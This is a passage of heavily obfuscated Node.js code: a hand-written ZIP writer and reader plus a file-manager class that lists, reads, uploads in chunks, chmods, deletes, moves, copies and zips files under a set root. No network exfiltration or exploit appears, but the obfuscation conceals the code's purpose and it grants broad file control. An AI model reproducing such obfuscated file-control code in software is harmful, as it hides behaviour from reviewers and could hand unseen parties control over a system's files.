            a0aL[fV(0x5b3)] = g;
        }
        const d = a0aL[fV(0x5b3)];
        let f = -0x1;
        for (let m = 0x0; b['zBrah'](m, a[fV(0x615)]); m++)
            f = b[fV(0x382)](f, 0x8) ^ d[b[fV(0x68b)](b[fV(0x210)](f, a[m]), 0xff)];
        return b[fV(0x7f9)](b[fV(0x210)](f, -0x1), 0x0);
    }
    static [a0d0(0x797)](a) {
        const fW = a0d0, b = {
                'CuGIn': function (g, h) {
                    return g & h;
                },
                'iilgR': function (g, h) {
                    return g | h;
                },
                'JYmqy': function (g, h) {
                    return g << h;
                },
                'xPoTk': function (g, h) {
                    return g >> h;
                },
                'RSXYu': function (g, h) {
                    return g & h;
                },
                'zWzEE': function (g, h) {
                    return g | h;
                },
                'VBlOm': function (g, h) {
                    return g << h;
                },
                'jFWqV': function (g, h) {
                    return g - h;
                },
                'NDCbu': function (g, h) {
                    return g + h;
                }
            }, c = b[fW(0xc70)](b[fW(0x14d)](b['iilgR'](b[fW(0xb56)](a[fW(0x6b7)](), 0xb), b[fW(0xb56)](a[fW(0x528)](), 0x5)), b[fW(0x57c)](a[fW(0x1f9)](), 0x1)), 0xffff), f = b[fW(0xe74)](b[fW(0x14d)](b[fW(0x2f2)](b[fW(0x3e2)](b[fW(0xc4d)](a[fW(0xbd6)](), 0x7bc), 0x9), b['NDCbu'](a[fW(0x772)](), 0x1) << 0x5), a[fW(0x690)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static ['openWriter'](a) {
        const fX = a0d0, b = {
                'CZQeN': function (i, j) {
                    return i < j;
                },
                'IrhaQ': function (i, j) {
                    return i - j;
                },
                'hExzl': function (i, j) {
                    return i >= j;
                },
                'AQvwf': function (i, j) {
                    return i > j;
                },
                'zjaqv': function (i, j) {
                    return i(j);
                },
                'uAAJS': function (i, j) {
                    return i + j;
                },
                'xejVu': function (i, j) {
                    return i + j;
                }
            }, c = a0l[fX(0x5d0)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const fY = fX;
            let j = 0x0;
            while (b[fY(0xa2c)](j, i[fY(0x615)]))
                j += a0l[fY(0xc5b)](c, i, j, b['IrhaQ'](i['length'], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const fZ = fX;
                if (b[fZ(0x3a6)](g, a0aL['ZIP_MAX_ENTRIES']))
                    return ![];
                const m = Buffer[fZ(0x58d)](i, fZ(0x132));
                j = j || Buffer['alloc'](0x0);
                const n = l ? 0x0 : a0aL[fZ(0x375)](j);
                let o = 0x0, p = j;
                if (!l && b[fZ(0x9a1)](j[fZ(0x615)], 0x0)) {
                    const u = a0n[fZ(0x4a1)](j, { 'level': 0x6 });
                    b[fZ(0xa2c)](u['length'], j[fZ(0x615)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0aL['_dosDateTime'](k || new Date()), s = Buffer[fZ(0xacf)](0x1e);
                s[fZ(0xbd8)](0x4034b50, 0x0), s[fZ(0x737)](0x14, 0x4), s['writeUInt16LE'](0x800, 0x6), s[fZ(0x737)](o, 0x8), s[fZ(0x737)](q, 0xa), s[fZ(0x737)](r, 0xc), s['writeUInt32LE'](n, 0xe), s[fZ(0xbd8)](p[fZ(0x615)], 0x12), s[fZ(0xbd8)](j[fZ(0x615)], 0x16), s['writeUInt16LE'](m[fZ(0x615)], 0x1a), s[fZ(0x737)](0x0, 0x1c), h(s), b[fZ(0x5ac)](h, m), b[fZ(0x5ac)](h, p);
                const t = Buffer[fZ(0xacf)](0x2e);
                return t[fZ(0xbd8)](0x2014b50, 0x0), t[fZ(0x737)](0x14, 0x4), t[fZ(0x737)](0x14, 0x6), t['writeUInt16LE'](0x800, 0x8), t[fZ(0x737)](o, 0xa), t[fZ(0x737)](q, 0xc), t[fZ(0x737)](r, 0xe), t['writeUInt32LE'](n, 0x10), t[fZ(0xbd8)](p[fZ(0x615)], 0x14), t[fZ(0xbd8)](j[fZ(0x615)], 0x18), t[fZ(0x737)](m[fZ(0x615)], 0x1c), t['writeUInt16LE'](0x0, 0x1e), t[fZ(0x737)](0x0, 0x20), t['writeUInt16LE'](0x0, 0x22), t[fZ(0x737)](0x0, 0x24), t['writeUInt32LE'](l ? 0x10 : 0x0, 0x26), t[fZ(0xbd8)](f, 0x2a), d[fZ(0x59a)](t, m), f += b[fZ(0x7ea)](b[fZ(0xb75)](0x1e, m['length']), p[fZ(0x615)]), g++, !![];
            },
            'close'() {
                const g0 = fX, i = Buffer[g0(0x7b6)](d), j = Buffer['alloc'](0x16);
                return j[g0(0xbd8)](0x6054b50, 0x0), j['writeUInt16LE'](0x0, 0x4), j[g0(0x737)](0x0, 0x6), j[g0(0x737)](g, 0x8), j[g0(0x737)](g, 0xa), j[g0(0xbd8)](i['length'], 0xc), j[g0(0xbd8)](f, 0x10), j[g0(0x737)](0x0, 0x14), b[g0(0x5ac)](h, i), b[g0(0x5ac)](h, j), a0l[g0(0x619)](c), g;
            }
        };
    }
    static [a0d0(0x766)](a) {
        const g1 = a0d0, b = {
                'chWLe': function (n, o) {
                    return n - o;
                },
                'jcYVM': function (n, o) {
                    return n >= o;
                },
                'eoksc': function (n, o) {
                    return n === o;
                },
                'irVXT': function (n, o) {
                    return n < o;
                },
                'JSzFF': function (n, o) {
                    return n + o;
                },
                'YICFr': function (n, o) {
                    return n + o;
                },
                'gOpxl': function (n, o) {
                    return n + o;
                },
                'PodGZ': function (n, o) {
                    return n < o;
                },
                'YuFCx': function (n, o) {
                    return n <= o;
                },
                'zAtwn': function (n, o) {
                    return n !== o;
                },
                'qmMjg': function (n, o) {
                    return n + o;
                },
                'PpnDb': function (n, o) {
                    return n + o;
                },
                'BHZDK': function (n, o) {
                    return n + o;
                },
                'kFvBm': function (n, o) {
                    return n + o;
                },
                'lMDDR': function (n, o) {
                    return n + o;
                },
                'bSzyt': 'utf8',
                'ixaxy': function (n, o) {
                    return n + o;
                },
                'asSEv': function (n, o) {
                    return n !== o;
                },
                'taHTE': function (n, o) {
                    return n & o;
                },
                'aTQrt': function (n, o) {
                    return n === o;
                },
                'nvIoQ': function (n, o) {
                    return n === o;
                },
                'hbmup': function (n, o) {
                    return n + o;
                },
                'CcOWq': function (n, o) {
                    return n + o;
                },
                'jfnAT': function (n, o) {
                    return n + o;
                },
                'JryqW': function (n, o) {
                    return n + o;
                }
            }, c = a0l[g1(0x902)](a);
        let d = -0x1;
        const f = Math[g1(0x8b4)](0x0, c[g1(0x615)] - (0xffff + 0x16));
        for (let n = b[g1(0x89f)](c[g1(0x615)], 0x16); b[g1(0xce5)](n, f); n--) {
            if (b[g1(0x7bd)](c[g1(0xe9c)](n), 0x6054b50)) {
                d = n;
                break;
            }
        }
        if (b[g1(0x5b6)](d, 0x0))
            throw new Error(g1(0xa77));
        const g = c[g1(0xb5d)](b[g1(0x76d)](d, 0xa)), h = c[g1(0xe9c)](b[g1(0x309)](d, 0xc)), j = c['readUInt32LE'](b[g1(0x309)](d, 0x10)), k = [];
        let l = j;
        const m = b['gOpxl'](j, h);
        for (let o = 0x0; b[g1(0x3b3)](o, g) && b['YuFCx'](l + 0x2e, m); o++) {
            if (b[g1(0xc28)](c[g1(0xe9c)](l), 0x2014b50))
                break;
            const q = c[g1(0xb5d)](b[g1(0x76d)](l, 0x8)), r = c[g1(0xb5d)](b[g1(0xbbf)](l, 0xa)), s = c['readUInt32LE'](b[g1(0xad1)](l, 0x10)), t = c[g1(0xe9c)](b[g1(0x76d)](l, 0x14)), u = c['readUInt32LE'](b[g1(0x76d)](l, 0x18)), v = c[g1(0xb5d)](b[g1(0xad1)](l, 0x1c)), w = c[g1(0xb5d)](b[g1(0xbc2)](l, 0x1e)), x = c[g1(0xb5d)](l + 0x20), y = c[g1(0xe9c)](b['kFvBm'](l, 0x26)), z = c[g1(0xe9c)](b['gOpxl'](l, 0x2a)), A = c[g1(0x174)](l + 0x2e, b['PpnDb'](b[g1(0xdc2)](l, 0x2e), v))['toString'](b[g1(0xd6)]);
            l += b['gOpxl'](b['ixaxy'](b['ixaxy'](0x2e, v), w), x);
            const B = {
                'name': A,
                'isDir': A['endsWith']('/') || b[g1(0x4b7)](y & 0x10, 0x0),
                'method': r,
                'crc': s,
                'size': u,
                'compressedSize': t,
                'encrypted': b[g1(0xc28)](b[g1(0x907)](q, 0x1), 0x0),
                'zip64': t === 0xffffffff || b[g1(0x7bd)](u, 0xffffffff) || b[g1(0x928)](z, 0xffffffff),
                'data': null
            };
            if (!B[g1(0x8f6)] && !B[g1(0x221)] && !B[g1(0x440)]) {
                if (b['YuFCx'](b['kFvBm'](z, 0x1e), c[g1(0x615)]) && b[g1(0x481)](c[g1(0xe9c)](z), 0x4034b50)) {
                    const C = c[g1(0xb5d)](b[g1(0xda4)](z, 0x1a)), D = c[g1(0xb5d)](b['PpnDb'](z, 0x1c)), E = b['gOpxl'](b[g1(0xbbf)](b['CcOWq'](z, 0x1e), C), D);
                    b[g1(0x225)](E, t) <= c[g1(0x615)] && (B[g1(0x426)] = c['slice'](E, b['JryqW'](E, t)));
                }
            }
            k[g1(0x59a)](B);
        }
        return k;
    }
    static [a0d0(0x634)](a) {
        const g2 = a0d0, b = {
                'zZwOC': function (c, d) {
                    return c === d;
                }
            };
        if (b[g2(0x69f)](a[g2(0xae)], 0x0))
            return a[g2(0x426)];
        if (b[g2(0x69f)](a[g2(0xae)], 0x8))
            return a0n[g2(0x78a)](a['data']);
        throw new Error(g2(0xac1)[g2(0x7b6)](a[g2(0xae)]));
    }
}
class a0aM {
    static async [a0d0(0x81d)](a, b = ![]) {
        const g3 = a0d0, c = {
                'iqTQG': g3(0x5bb),
                'QvEMS': g3(0x739),
                'RrixL': function (h, i) {
                    return h & i;
                },
                'QWbvI': function (h, i) {
                    return h(i);
                },
                'biPnk': function (h, i) {
                    return h(i);
                },
                'NjTIq': 'Path\x20not\x20found',
                'fSxfU': function (h, i) {
                    return h(i);
                }
            }, d = a0o[g3(0x983)](a0ax[g3(0x45b)], a || '.');
        if (!c[g3(0x653)](a0aK, d))
            throw new Error(g3(0xa5b));
        if (!a0l[g3(0x7d2)](d))
            throw new Error(c[g3(0xd82)]);
        const f = [], g = h => {
                const g4 = g3, i = a0l['readdirSync'](h);
                for (const j of i) {
                    const k = a0o[g4(0x782)](h, j), l = a0l[g4(0x9a5)](k), m = new a0Z();
                    m[g4(0xe77)] = j, m[g4(0xda2)] = a0o[g4(0xeda)](a0ax[g4(0x45b)], k), m[g4(0x527)] = l[g4(0xa43)]() ? c['iqTQG'] : c[g4(0xe1f)], m[g4(0xd76)] = l[g4(0xd76)], m[g4(0x7a7)] = l[g4(0x7a7)][g4(0xdac)](), m['mode'] = this[g4(0x1f6)](l[g4(0x3d3)], l[g4(0xa43)]()), m['mode_octal'] = '0o'['concat'](c['RrixL'](l[g4(0x3d3)], 0x1ff)[g4(0xa27)](0x8)), m[g4(0x466)] = ''[g4(0x7b6)](l[g4(0x7f2)], ':')[g4(0x7b6)](l[g4(0x92a)]), f[g4(0x59a)](m), b && l[g4(0xa43)]() && c[g4(0x38e)](g, k);
                }
            };
        return c[g3(0xe2b)](g, d), f;
    }
    static async [a0d0(0x9f3)](a) {
        const g5 = a0d0, b = {
                'zwavS': function (d, f) {
                    return d(f);
                },
                'qnXYM': function (d, f) {
                    return d & f;
                },
                'cAmOX': 'directory',
                'btamZ': g5(0x739)
            }, c = [];
        for (const d of a) {
            const f = a0o[g5(0x983)](a0ax[g5(0x45b)], d);
            if (!b[g5(0x656)](a0aK, f))
                continue;
            try {
                const g = a0l['statSync'](f), h = this['_checkAccess'](f, a0l[g5(0x8e0)][g5(0xc78)]), i = this['_checkAccess'](f, a0l['constants'][g5(0x4a8)]), j = this['_checkAccess'](f, a0l['constants'][g5(0xb8c)]), k = new a0a0();
                k[g5(0xda2)] = a0o[g5(0xeda)](a0ax[g5(0x45b)], f), k[g5(0xe77)] = a0o[g5(0x2ed)](f), k[g5(0x3d3)] = this[g5(0x1f6)](g[g5(0x3d3)], g[g5(0xa43)]()), k['mode_octal'] = '0o'['concat'](b[g5(0x93c)](g[g5(0x3d3)], 0x1ff)['toString'](0x8)), k[g5(0x527)] = g[g5(0xa43)]() ? b[g5(0x2dc)] : b[g5(0x415)], k['readable'] = h, k[g5(0xbe9)] = i, k[g5(0x71b)] = j, c['push'](k);
            } catch (l) {
            }
        }
        return c;
    }
    static [a0d0(0x8ed)](a, b) {
        const g6 = a0d0;
        try {
            return a0l[g6(0xa75)](a, b), !![];
        } catch {
            return ![];
        }
    }
    static [a0d0(0x214)](a) {
        const g7 = a0d0, b = {
                'DLDqC': function (c, d) {
                    return c === d;
                },
                'FcAKq': g7(0x5f6),
                'clnyj': 'string',
                'xbbBo': function (c, d, f) {
                    return c(d, f);
                },
                'grHSW': g7(0x47d)
            };
        if (b[g7(0x3a5)](typeof a, b['FcAKq']))
            return a;
        if (typeof a === b['clnyj']) {
            const c = a['trim']();
            if (/^[0-7]{3,4}$/[g7(0xdbb)](c))
                return b[g7(0xbfa)](parseInt, c, 0x8);
        }
        throw new Error(b[g7(0x7fa)]);
    }
    static [a0d0(0x1f6)](a, b) {
        const g8 = a0d0, c = {
                'WCeWM': function (i, j) {
                    return i & j;
                },
                'VlFKc': function (i, j, k) {
                    return i(j, k);
                }
            }, d = b ? 'd' : '-', f = [
                'r',
                'w',
                'x'
            ], g = c[g8(0x329)](a, 0x1ff)[g8(0xa27)](0x8)[g8(0x7d4)](0x3, '0');
        let h = d;
        for (const i of g) {
            const j = c[g8(0x25e)](parseInt, i, 0xa);
            h += f[g8(0x9c5)]((k, l) => j & 0x4 >> l ? k : '-')[g8(0x782)]('');
        }
        return h;
    }
    static async [a0d0(0xa44)](a, b = ![]) {
        const g9 = a0d0, c = {
                'GDFMc': function (g, h) {
                    return g(h);
                },
                'oqUoZ': function (g, h) {
                    return g(h);
                },
                'LDlUT': function (g, h) {
                    return g(h);
                },
                'AuMKZ': g9(0x9e7),
                'HXpse': function (g, h) {
                    return g(h);
                },
                'VIfQc': g9(0x755)
            }, d = [];
        for (const [g, h] of Object[g9(0x471)](a)) {
            const i = a0o[g9(0x983)](a0ax[g9(0x45b)], g);
            if (!a0aK(i)) {
                d[g9(0x59a)]({
                    'path': g,
                    'requested': c[g9(0xca7)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[g9(0xf8)]
                });
                continue;
            }
            try {
                const j = this[g9(0x214)](h), k = m => {
                        const ga = g9;
                        a0l[ga(0x3b0)](m, j);
                    };
                if (b && a0l[g9(0x7d2)](i) && a0l[g9(0x9a5)](i)[g9(0xa43)]()) {
                    const m = n => {
                        const gb = g9;
                        c[gb(0xc01)](k, n);
                        const o = a0l['readdirSync'](n);
                        for (const p of o) {
                            const q = a0o[gb(0x782)](n, p);
                            a0l[gb(0x9a5)](q)[gb(0xa43)]() ? c['GDFMc'](m, q) : c[gb(0x8d9)](k, q);
                        }
                    };
                    m(i);
                } else
                    c[g9(0x90b)](k, i);
                const l = j[g9(0xa27)](0x8);
                d[g9(0x59a)]({
                    'path': g,
                    'requested': String(h),
                    'applied': l,
                    'mode_octal': '0o'['concat'](l),
                    'status': 'ok'
                });
            } catch (n) {
                d[g9(0x59a)]({
                    'path': g,
                    'requested': c[g9(0xc01)](String, h),
                    'applied': '',
                    'mode_octal': '',
                    'status': c[g9(0x81f)],
                    'message': n[g9(0xf18)]
                });
            }
        }
        const f = d[g9(0x74d)](o => o[g9(0xab3)] === 'ok')[g9(0x615)];
        return {
            'status': 'ok',
            'total': d['length'],
            'success': f,
            'results': d
        };
    }
    static async [a0d0(0xd58)](a) {
        const gc = a0d0, b = {
                'laieZ': function (h, i) {
                    return h * i;
                },
                'vbfgw': gc(0x821),
                'WRjlG': 'base64',
                'oCcqu': 'utf-8'
            }, c = a0o[gc(0x983)](a0ax[gc(0x45b)], a);
        if (!a0aK(c))
            throw new Error(gc(0xa5b));
        const d = a0l[gc(0x9a5)](c);
        if (d[gc(0xd76)] > b[gc(0x812)](0x400, 0x400))
            throw new Error(b['vbfgw']);
        const f = a0l[gc(0x902)](c), g = this[gc(0xefc)](f);
        return {
            'status': 'ok',
            'path': a0o[gc(0xeda)](a0ax[gc(0x45b)], c),
            'content': g ? a0w[gc(0x11d)](f) : f[gc(0xa27)]('utf8'),
            'encoding': g ? b[gc(0x97b)] : b[gc(0xcba)],
            'is_binary': g,
            'size': d[gc(0xd76)]
        };
    }
    static ['_isBinary'](a) {
        const gd = a0d0, b = {
                'KRwwz': function (c, d) {
                    return c === d;
                },
                'fTUzc': function (c, d) {
                    return c < d;
                }
            };
        if (!a || b['KRwwz'](a[gd(0x615)], 0x0))
            return ![];
        for (let c = 0x0; b[gd(0xbda)](c, Math[gd(0xb66)](a[gd(0x615)], 0x200)); c++) {
            if (b['KRwwz'](a[c], 0x0))
                return !![];
        }
        return ![];
    }
    static async [a0d0(0x736)](a, b, c, d = null, f = null) {
        const ge = a0d0, g = {
                'pLPhK': function (l, m) {
                    return l(m);
                },
                'Vauci': 'Access\x20denied:\x20path\x20outside\x20root',
                'wHwuf': function (l, m) {
                    return l > m;
                },
                'GcXae': ge(0x821),
                'qiacj': function (l, m) {
                    return l !== m;
                },
                'yxvlI': function (l, m) {
                    return l(m);
                },
                'QiVMB': function (l, m) {
                    return l(m);
                },
                'FpcRD': ge(0x36f),
                'dRdSH': function (l, m) {
                    return l === m;
                },
                'KvCop': function (l, m) {
                    return l < m;
                }
            }, h = a0o[ge(0x983)](a0ax[ge(0x45b)], a);
        let j = h;
        b && (j = a0o[ge(0x782)](h, b));
        if (!g[ge(0xf05)](a0aK, j))
            throw new Error(g[ge(0xba4)]);
        !a0l[ge(0x7d2)](a0o[ge(0x6af)](j)) && a0l['mkdirSync'](a0o['dirname'](j), { 'recursive': !![] });
        const k = a0w['toByteArray'](c);
        if (g[ge(0x7f7)](k[ge(0x615)], a0ax['MAX_UPLOAD_SIZE']))
            throw new Error(g['GcXae']);
        if (g[ge(0x13f)](d, null) && g[ge(0x13f)](f, null)) {
            const l = g['yxvlI'](Number, d), m = g['QiVMB'](Number, f);
            if (Number[ge(0xded)](l) || Number['isNaN'](m))
                throw new Error(g[ge(0xbd9)]);
            const n = a0o[ge(0x782)](a0o[ge(0x6af)](j), ge(0xb76), a0o[ge(0x2ed)](j));
            !a0l[ge(0x7d2)](n) && a0l[ge(0x7ac)](n, { 'recursive': !![] });
            const o = a0o[ge(0x782)](n, ge(0xb72)[ge(0x7b6)](l));
            a0l['writeFileSync'](o, k);
            const p = a0l['readdirSync'](n)[ge(0x74d)](s => s[ge(0x46a)]('chunk_')), q = p['length'], r = g[ge(0x9ca)](q, m);
            if (r) {
                const s = a0l[ge(0x909)](j);
                for (let u = 0x0; g[ge(0x68d)](u, m); u++) {
                    const v = a0o[ge(0x782)](n, ge(0xb72)[ge(0x7b6)](u));
                    if (!a0l['existsSync'](v)) {
                        s[ge(0xd81)]();
                        throw new Error(ge(0x841)[ge(0x7b6)](u));
                    }
                    s[ge(0x5a6)](a0l['readFileSync'](v));
                }
                s[ge(0x65c)]();
                const t = a0o[ge(0x6af)](n);
                a0l[ge(0x82f)](n, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l[ge(0xd0c)](t);
                } catch (w) {
                }
            }
            return {
                'status': 'ok',
                'path': a0o['relative'](a0ax[ge(0x45b)], j),
                'received': q,
                'total': m,
                'chunked': !![]
            };
        }
        return a0l[ge(0x8e8)](j, k), {
            'status': 'ok',
            'path': a0o[ge(0xeda)](a0ax[ge(0x45b)], j),
            'received': k[ge(0x615)],
            'total': k[ge(0x615)],
            'chunked': ![]
        };
    }
    static async ['uploadFileRaw'](a, b, c, d = null, f = null) {
        const gf = a0d0, g = {
                'VPRjG': function (k, l) {
                    return k || l;
                },
                'cuGKm': function (k, l) {
                    return k(l);
                },
                'PHoOD': gf(0xa5b),
                'TsuUf': function (k, l) {
                    return k > l;
                },
                'RhgWL': gf(0x821),
                'wBaRy': function (k, l) {
                    return k !== l;
                },
                'qcPyy': gf(0x36f),
                'wZSjN': gf(0xb76),
                'jGdXj': function (k, l) {
                    return k < l;
                },
                'XmgdG': gf(0x814),
                'fIChs': gf(0xcfe)
            }, h = a0o[gf(0x983)](a0ax[gf(0x45b)], g[gf(0x3bd)](a, '.'));
        let j = h;
        b && (j = a0o[gf(0x782)](h, b));
        if (!g[gf(0xee6)](a0aK, j))
            throw new Error(g[gf(0x21f)]);
        !a0l[gf(0x7d2)](a0o['dirname'](j)) && a0l[gf(0x7ac)](a0o[gf(0x6af)](j), { 'recursive': !![] });
        if (g[gf(0x3f0)](c[gf(0x615)], a0ax[gf(0x612)]))
            throw new Error(g[gf(0xb95)]);
        if (g[gf(0xb73)](d, null) && g['wBaRy'](f, null)) {
            const k = Number(d), l = g['cuGKm'](Number, f);
            if (Number[gf(0xded)](k) || Number[gf(0xded)](l))
                throw new Error(g['qcPyy']);
            const m = a0o[gf(0x782)](a0o[gf(0x6af)](j), g[gf(0x8e6)], a0o[gf(0x2ed)](j));
            !a0l[gf(0x7d2)](m) && a0l[gf(0x7ac)](m, { 'recursive': !![] });
            const n = a0o[gf(0x782)](m, gf(0xb72)[gf(0x7b6)](k));
            a0l[gf(0x8e8)](n, c);
            const o = a0l[gf(0x849)](m)['filter'](r => r[gf(0x46a)](gf(0xb72))), p = o[gf(0x615)], q = p === l;
            if (q) {
                const r = [];
                for (let t = 0x0; g[gf(0x1cd)](t, l); t++) {
                    const u = a0o['join'](m, gf(0xb72)['concat'](t));
                    if (!a0l[gf(0x7d2)](u))
                        throw new Error('Missing\x20chunk\x20'[gf(0x7b6)](t));
                    r[gf(0x59a)](a0l[gf(0x902)](u));
                }
                a0l['writeFileSync'](j, Buffer[gf(0x7b6)](r));
                const s = a0o['dirname'](m);
                a0l[gf(0x82f)](m, {
                    'recursive': !![],
                    'force': !![]
                });
                try {
                    a0l['rmdirSync'](s);
                } catch (v) {
                }
                return {
                    'status': 'ok',
                    'path': a0o[gf(0xeda)](a0ax[gf(0x45b)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[gf(0x4ca)]
                };
            }
            return {
                'status': 'ok',
                'path': a0o[gf(0xeda)](a0ax['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': gf(0xa03)[gf(0x7b6)](k, '\x20uploaded.\x20Waiting\x20for\x20remaining\x20blocks.')
            };
        }
        return a0l[gf(0x8e8)](j, c), {
            'status': 'ok',
            'path': a0o[gf(0xeda)](a0ax[gf(0x45b)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g[gf(0x222)]
        };
    }
    static async [a0d0(0x856)](a) {
        const gg = a0d0, b = {
                'LRmsk': function (g, h) {
                    return g(h);
                },
                'DpXlj': 'Access\x20denied:\x20path\x20outside\x20root'
            }, c = a0o[gg(0x983)](a0ax[gg(0x45b)], a);
        if (!b['LRmsk'](a0aK, c))
            throw new Error(b[gg(0x55c)]);
        if (!a0l[gg(0x7d2)](c))
            throw new Error(gg(0x910));
        const d = a0l['statSync'](c), f = await a0l[gg(0x535)][gg(0xd58)](c);
        return {
            'path': a0o[gg(0xeda)](a0ax[gg(0x45b)], c),
            'content': f,
            'size': d[gg(0xd76)]
        };
    }
    static async [a0d0(0x8ee)](a) {
        const gh = a0d0, b = {
                'UBAbR': gh(0x9e7),
                'xynik': gh(0x626)
            }, c = [];
        for (const d of a) {
            const f = a0o['resolve'](a0ax[gh(0x45b)], d);
            if (!a0aK(f)) {
                c[gh(0x59a)]({
                    'path': d,
                    'status': b[gh(0x43f)]
                });
                continue;
            }
            try {
                if (a0l[gh(0x7d2)](f)) {
                    const g = a0l[gh(0x9a5)](f);
                    g['isDirectory']() ? a0l[gh(0x82f)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c[gh(0x59a)]({
                        'path': d,
                        'status': gh(0xafb)
                    });
                } else
                    c['push']({
                        'path': d,
                        'status': b[gh(0xbb8)]
                    });
            } catch (h) {
                c[gh(0x59a)]({
                    'path': d,
                    'status': 'error',
                    'message': h[gh(0xf18)]
                });
            }
        }
        return c;
    }
    static async [a0d0(0xe09)](a) {
        const gi = a0d0, b = {
                'SYKLn': function (d, f) {
                    return d(f);
                },
                'hBypc': 'access_denied',
                'tnave': gi(0x755)
            }, c = [];
        for (const [d, f] of Object[gi(0x471)](a)) {
            const g = a0o[gi(0x983)](a0ax[gi(0x45b)], d), h = a0o[gi(0x983)](a0ax[gi(0x45b)], f);
            if (!b[gi(0x522)](a0aK, g) || !b['SYKLn'](a0aK, h)) {
                c[gi(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': b[gi(0x9e5)]
                });
                continue;
            }
            try {
                const i = a0o[gi(0x6af)](h);
                !a0l[gi(0x7d2)](i) && a0l[gi(0x7ac)](i, { 'recursive': !![] }), a0l[gi(0x334)](g, h), c[gi(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[gi(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': b[gi(0x17b)],
                    'message': j['message']
                });
            }
        }
        return c;
    }
    static async ['copyFiles'](a) {
        const gj = a0d0, b = {
                'wdTYm': function (d, f, g) {
                    return d(f, g);
                },
                'DWWSC': function (d, f) {
                    return d(f);
                },
                'VDAPO': gj(0x626),
                'jnraM': function (d, f, g) {
                    return d(f, g);
                },
                'MsHGc': gj(0x755)
            }, c = [];
        for (const [d, f] of Object[gj(0x471)](a)) {
            const g = a0o[gj(0x983)](a0ax[gj(0x45b)], d), h = a0o[gj(0x983)](a0ax[gj(0x45b)], f);
            if (!b['DWWSC'](a0aK, g) || !a0aK(h)) {
                c[gj(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': gj(0x9e7)
                });
                continue;
            }
            try {
                if (!a0l[gj(0x7d2)](g)) {
                    c[gj(0x59a)]({
                        'from': d,
                        'to': f,
                        'status': b[gj(0xbd7)]
                    });
                    continue;
                }
                const i = a0o[gj(0x6af)](h);
                !a0l[gj(0x7d2)](i) && a0l[gj(0x7ac)](i, { 'recursive': !![] });
                const j = a0l[gj(0x9a5)](g);
                if (j['isDirectory']()) {
                    if (a0l[gj(0xa1d)])
                        a0l[gj(0xa1d)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const gk = gj;
                            if (a0l[gk(0x9a5)](l)[gk(0xa43)]()) {
                                if (!a0l['existsSync'](m))
                                    a0l[gk(0x7ac)](m, { 'recursive': !![] });
                                for (const n of a0l[gk(0x849)](l)) {
                                    b[gk(0x8d8)](k, a0o[gk(0x782)](l, n), a0o[gk(0x782)](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b[gj(0xad6)](k, g, h);
                    }
                } else
                    a0l[gj(0x1a1)](g, h);
                c[gj(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[gj(0x59a)]({
                    'from': d,
                    'to': f,
                    'status': b[gj(0x603)],
                    'message': l[gj(0xf18)]
                });
            }
        }
        return c;
    }
    static async [a0d0(0x9f8)](a) {
        const gl = a0d0, b = {
                'OIHUZ': function (d, f) {
                    return d(f);
                }
            }, c = a0o['resolve'](a0ax['FILE_ROOT'], a);
        if (!b[gl(0x384)](a0aK, c))
            throw new Error('Access\x20denied:\x20path\x20outside\x20root');
        return a0l['mkdirSync'](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0o[gl(0xeda)](a0ax[gl(0x45b)], c)
        };
    }
    static [a0d0(0x8b6)](a) {
        const gm = a0d0;
        return a0o['relative'](a0ax[gm(0x45b)], a) || '.';
    }
    static async ['zipItems'](a, b, c = ![]) {
        const gn = a0d0, d = {
                'CKWPM': function (k, l, m) {
                    return k(l, m);
                },
                'GjRUF': 'path\x20required',
                'cKhEi': function (k, l) {
                    return k === l;
                },
                'Ekbns': gn(0x126),
                'qriCL': function (k, l) {
                    return k(l);
                },
                'LHUau': gn(0xa5b),
                'XmIRF': gn(0xed1),
                'NzMgJ': function (k, l) {
                    return k || l;
                },
                'yLVvS': gn(0x626),
                'Eefzs': gn(0x755),
                'EkwuG': gn(0xa2f)
            };
        if (!a)
            throw new Error(d[gn(0xe34)]);
        if (!Array[gn(0x5f9)](b) || d[gn(0xc09)](b[gn(0x615)], 0x0))
            throw new Error(d[gn(0xb6a)]);
        const f = a0o[gn(0x983)](a0ax[gn(0x45b)], a);
        if (!d[gn(0x9eb)](a0aK, f))
            throw new Error(d[gn(0xbb4)]);
        if (a0l[gn(0x7d2)](f) && a0l[gn(0x9a5)](f)['isDirectory']())
            throw new Error('Target\x20is\x20a\x20directory:\x20'[gn(0x7b6)](a));
        a0l[gn(0x7ac)](a0o['dirname'](f), { 'recursive': !![] });
        if (a0l['existsSync'](f))
            a0l[gn(0xa78)](f);
        const g = a0aL['openWriter'](f), h = [];
        let i = 0x0, j = ![];
        for (const k of b) {
            if (j) {
                h[gn(0x59a)]({
                    'item': k,
                    'status': d['XmIRF'],
                    'added': 0x0
                });
                continue;
            }
            const l = a0o[gn(0x983)](a0ax['FILE_ROOT'], d['NzMgJ'](k, ''));
            try {
                if (!a0aK(l)) {
                    h[gn(0x59a)]({
                        'item': k,
                        'status': gn(0x755),
                        'added': 0x0
                    });
                    continue;
                }
                if (!a0l['existsSync'](l)) {
                    h['push']({
                        'item': k,
                        'status': d['yLVvS'],
                        'added': 0x0
                    });
                    continue;
                }
                const m = a0l[gn(0x9a5)](l);
                let n = 0x0, o = ![];
                if (m[gn(0xdf2)]()) {
                    if (!g[gn(0x6b6)](a0o[gn(0x2ed)](l), a0l[gn(0x902)](l), m[gn(0x7a7)])) {
                        j = !![], h['push']({
                            'item': k,
